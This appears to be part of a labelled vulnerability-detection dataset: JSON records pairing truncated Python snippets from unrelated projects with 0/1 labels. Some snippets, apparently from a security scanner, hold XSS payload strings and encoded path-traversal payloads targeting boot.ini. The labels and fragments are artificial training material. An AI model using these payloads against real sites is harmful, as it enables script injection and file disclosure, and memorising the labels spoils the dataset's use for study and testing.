pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources, locale): \"\"", "label": 0}, {"snippet_id": 29318, "code": "/etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\"] \telse: \t\tif kwargs.get(\"just_save\")==\"test\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo rm -f \" +tmp_file] \t\telif kwargs", "label": 0}, {"snippet_id": 21181, "code": " name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',", "label": 0}, {"snippet_id": 32882, "code": ">\\n') self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path) self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith('.'): continue", "label": 1}, {"snippet_id": 25337, "code": "( final_attrs, id='%s_%s' %(id_, i), title=self.scheme['fields'][i][1], placeholder=self.scheme['fields'][i][1], ) final_attrs['data-size']=self.scheme['fields'][i][2] output.append(widget.render(name ", "label": 0}, {"snippet_id": 52018, "code": " liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm", "label": 0}, {"snippet_id": 34856, "code": " \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname", "label": 0}, {"snippet_id": 46867, "code": " return markdown(content) async def clear_mc(self): for key in(MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST): await clear_mc(key % self.post_id) @property async def user(self): return await GithubUser.get(gid", "label": 0}, {"snippet_id": 3422, "code": ".text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\"", "label": 0}, {"snippet_id": 17170, "code": "='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware", "label": 0}, {"snippet_id": 51843, "code": "(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', 'datefmt': '%Y-%m-%d", "label": 0}, {"snippet_id": 26319, "code": " Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False", "label": 0}, {"snippet_id": 6583, "code": "._parsed_content_packages: return self._parsed_content_packages value=self.config.get(self.section, 'content_packages') res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this.partition('", "label": 0}, {"snippet_id": 51661, "code": " AUTH_PASSWORD_VALIDATORS=[ { 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', }, { 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', }, { 'NAME': 'django.contrib", "label": 0}, {"snippet_id": 43521, "code": "(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join", "label": 0}, {"snippet_id": 33152, "code": "\"Redirects to README.md.\"\"\" def get(self): return self.redirect(README_MD) class CronUpdateBuckets(webapp2.RequestHandler): \"\"\"Updates buckets from configs.\"\"\" @decorators.require_cronjob def get(self)", "label": 0}, {"snippet_id": 6167, "code": "(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}\".format(filename)) @property def num_threads(self): \"\"\" Number of worker threads to start(integer). EduID IdP", "label": 0}, {"snippet_id": 3180, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update", "label": 0}, {"snippet_id": 19626, "code": "(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course()", "label": 0}, {"snippet_id": 4702, "code": "'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', ", "label": 0}, {"snippet_id": 4634, "code": "'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', ", "label": 0}, {"snippet_id": 50801, "code": " flags.get('ANSI', True)) nocolor=options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not(xterm256 or useansi)) screenreader=options.get(\"screenreader\", flags.get(\"SCREENREADER\", False)) prompt=options.get(", "label": 0}, {"snippet_id": 14889, "code": " settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout", "label": 0}, {"snippet_id": 29795, "code": " act==\"checkrestart\": \tservers=sql.get_dick_permit(ip=serv) \tfor server in servers: \t\tif server !=\"\": \t\t\tprint(\"ok\") \t\t\tsys.exit() \tsys.exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U", "label": 0}, {"snippet_id": 19107, "code": " EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver", "label": 0}, {"snippet_id": 4969, "code": "/scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co", "label": 0}, {"snippet_id": 32819, "code": "'text/css') self._WriteTemplate(template) def _DoNotFound(self): self._WriteHeader('text/html', status_code=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self", "label": 0}, {"snippet_id": 4104, "code": "\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers", "label": 0}, {"snippet_id": 36265, "code": " fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): ", "label": 0}, {"snippet_id": 34771, "code": "): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns", "label": 0}, {"snippet_id": 34868, "code": " self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None:", "label": 0}, {"snippet_id": 23993, "code": " test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with", "label": 0}, {"snippet_id": 5260, "code": "', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt',", "label": 0}, {"snippet_id": 50469, "code": " in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called by render_POST when the client is signalling", "label": 0}, {"snippet_id": 22565, "code": "),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import", "label": 0}, {"snippet_id": 29931, "code": ".getcwd()+'/keys/'): \t\tos.makedirs(os.getcwd()+'/keys/') \t \tssh_keys=os.path.dirname(os.getcwd())+'/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')", "label": 0}, {"snippet_id": 40822, "code": " \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key", "label": 0}, {"snippet_id": 47428, "code": " else: f.add_content(PlainText('<h3>Add new user</h3>')) if not profile: f.add_content(PlainText(\"username(can't be edited later on): \")) f.add_content(TextField(name='username')) if http_request.GET.get(", "label": 0}, {"snippet_id": 24822, "code": " Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping", "label": 0}, {"snippet_id": 39578, "code": " not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn", "label": 0}, {"snippet_id": 25045, "code": " get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\"", "label": 0}, {"snippet_id": 50306, "code": ".sessionhandler.connect(sess) self.last_alive[csessid]=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg':", "label": 0}, {"snippet_id": 48649, "code": " r.pickupDate=datetime.datetime.now() else: return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\") if request.POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if request.POST.get(\"contact", "label": 0}, {"snippet_id": 6592, "code": " for this in value.split(','): this=this.strip() name, _sep, path,=this.partition(':') res.append((name, path)) self._parsed_content_packages=res return res @property def verify_request_signatures(self", "label": 0}, {"snippet_id": 32149, "code": "(mapping): rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name", "label": 1}, {"snippet_id": 11360, "code": "/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"", "label": 0}, {"snippet_id": 35718, "code": " \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 26311, "code": ", ValueError): raise ValidationError(_('This VAT ID is not valid. Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{", "label": 0}, {"snippet_id": 18292, "code": "]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*", "label": 1}, {"snippet_id": 35908, "code": ", value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t", "label": 0}, {"snippet_id": 27165, "code": "*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"", "label": 1}, {"snippet_id": 26722, "code": "%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', ", "label": 0}, {"snippet_id": 50989, "code": " does not support due_ or something. Which is absolutely terrible and vague. I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy when something will run. Because", "label": 0}, {"snippet_id": 15482, "code": "'green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing", "label": 0}, {"snippet_id": 48431, "code": "[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save() if \"srid\" in request.GET: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id) +\"&srid=\" +request.GET", "label": 1}, {"snippet_id": 42084, "code": "'__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname", "label": 0}, {"snippet_id": 28506, "code": ")==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open", "label": 0}, {"snippet_id": 30143, "code": "{print $1}'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('action_hap') is not None and serv is not None: \taction=form.getvalue('action_hap') \t \tif funct.check_haproxy_config(serv): \t", "label": 0}, {"snippet_id": 39871, "code": "\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\")", "label": 0}, {"snippet_id": 25728, "code": " else None, min_value=Decimal('0.00'), ) elif q.type==Question.TYPE_STRING: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, initial=initial.answer if initial else None, ", "label": 0}, {"snippet_id": 740, "code": ".api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s", "label": 1}, {"snippet_id": 32222, "code": ".path.dirname(THIS_DIR)) sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument", "label": 0}, {"snippet_id": 19776, "code": " tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup", "label": 0}, {"snippet_id": 30078, "code": " master[0] !=None: \t\t\tfunct.upload(master[0], cert_path, name) \ttry: \t\tfunct.upload(serv, cert_path, name) \texcept: \t\tpass \t \tos.system(\"mv %s %s\" %(name, cert_local_dir)) \tfunct.logging(serv, \"add.py \t", "label": 0}, {"snippet_id": 2551, "code": " xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result", "label": 0}, {"snippet_id": 41481, "code": ") if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content", "label": 0}, {"snippet_id": 50965, "code": " resources from import_export.admin import ImportExportModelAdmin from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList class MyPeriodicTaskForm(PeriodicTaskForm", "label": 0}, {"snippet_id": 45789, "code": ") }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c", "label": 0}, {"snippet_id": 959, "code": " impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url", "label": 1}, {"snippet_id": 39715, "code": "\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not", "label": 0}, {"snippet_id": 21334, "code": ")/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 34053, "code": " \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments))", "label": 0}, {"snippet_id": 5524, "code": " _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss'", "label": 0}, {"snippet_id": 10179, "code": "' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store", "label": 0}, {"snippet_id": 44279, "code": "(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2',", "label": 0}, {"snippet_id": 54726, "code": ": a=form.save(commit=False) a.author=self.request.user a.article=self.object a.save() return super().form_valid(form) def is_mobile(useragent): devices=[\"Android\", \"iPhone\", \"SymbianOS\", \"Windows Phone", "label": 0}, {"snippet_id": 9094, "code": "+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 346, "code": " try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request", "label": 1}, {"snippet_id": 54586, "code": " success_url='/login/' def form_valid(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles", "label": 0}, {"snippet_id": 37203, "code": " frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname", "label": 1}, {"snippet_id": 31012, "code": "')==\"1\": \t\tfunct.install_haproxy(master) \t\tfunct.install_haproxy(slave) \t\t \tif form.getvalue('syn_flood')==\"1\": \t\tfunct.syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts", "label": 0}, {"snippet_id": 8034, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes", "label": 0}, {"snippet_id": 820, "code": "\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid)", "label": 1}, {"snippet_id": 17583, "code": "('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$", "label": 0}, {"snippet_id": 46900, "code": " async def add_comment(self, user_id, content, ref_id=0): obj=await Comment.create(github_id=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio", "label": 0}, {"snippet_id": 51416, "code": " import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path.dirname(__file__)) SECRET_KEY='_dzlo^9d", "label": 0}, {"snippet_id": 28866, "code": "' % sshException \t\tpass \texcept paramiko.BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException \t\tpass \texcept Exception as e: \t\tif e==\"No", "label": 0}, {"snippet_id": 1104, "code": " headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param==", "label": 0}, {"snippet_id": 20922, "code": "'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template':", "label": 0}, {"snippet_id": 24133, "code": ".test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\"", "label": 0}, {"snippet_id": 786, "code": ": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param", "label": 0}, {"snippet_id": 38431, "code": "'Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar", "label": 0}, {"snippet_id": 12017, "code": ", url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch", "label": 0}, {"snippet_id": 50177, "code": " it to the client as soon as possible. Args: csessid(int): Session id. data(list): A send structure[cmdname,[args],{kwargs}]. \"\"\" request=self.requests.get(csessid) if request: request.write(jsonify(data", "label": 0}, {"snippet_id": 32439, "code": "://gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md Args: value: The name of a section that is to be converted. _separator: Unused. This is actually a configurable string that is used", "label": 0}, {"snippet_id": 10377, "code": " test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir", "label": 0}, {"snippet_id": 26798, "code": "%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 33638, "code": " context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t", "label": 0}, {"snippet_id": 24447, "code": "'testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get(", "label": 0}, {"snippet_id": 10845, "code": ") test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg", "label": 0}, {"snippet_id": 47357, "code": " from.magic import get_current_user import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id=None profile: Profile=None if http_request.GET.get(\"user_id\"): user_id=int(http_request", "label": 0}, {"snippet_id": 51759, "code": ".dirname(__file__)) +'/uploads/') UPLOAD_ROOT=os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) +'/uploads/') LOGIN_URL=\"two_factor:login\" LOGIN_REDIRECT_URL=\"/dashboard/\" LOGOUT_REDIRECT_URL", "label": 0}, {"snippet_id": 16720, "code": "<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 26275, "code": ": if data.get('vat_id')[:2] !=str(data.get('country')): raise ValidationError(_('Your VAT ID does not match the selected country.')) try: result=vat_moss.id.validate(data.get('vat_id')) if result: country_code", "label": 0}, {"snippet_id": 5779, "code": "<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\"", "label": 0}, {"snippet_id": 40669, "code": " df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print", "label": 0}, {"snippet_id": 31287, "code": ".value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[5]) \t\t\tmetrics[rep_date]", "label": 0}, {"snippet_id": 37870, "code": ".get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro", "label": 0}, {"snippet_id": 41781, "code": "(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype", "label": 0}, {"snippet_id": 32102, "code": " ungettext_lazy( u\"Deleted Mapping\", u\"Deleted Mappings\", count ) policy_rules=((\"identity\", \"identity:delete_mapping\"),) def delete(self, request, obj_id): api.keystone.mapping_delete(request, obj_id) class", "label": 0}, {"snippet_id": 54585, "code": "' form_class=UserCreationForm success_url='/login/' def form_valid(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article", "label": 0}, {"snippet_id": 1053, "code": ".replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"", "label": 1}, {"snippet_id": 51003, "code": " schedule. This makes it very hazy when something will run. Because of this, we'll move to the horrifically designed absolute nightmare format Crontab. Crontab would be half-great if the parameters where", "label": 0}, {"snippet_id": 31589, "code": "() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\", \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000", "label": 0}, {"snippet_id": 52575, "code": "(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters", "label": 0}, {"snippet_id": 35791, "code": " self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title", "label": 0}, {"snippet_id": 23917, "code": ", 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite", "label": 1}, {"snippet_id": 11129, "code": ".default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit..", "label": 0}, {"snippet_id": 18781, "code": ".submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or 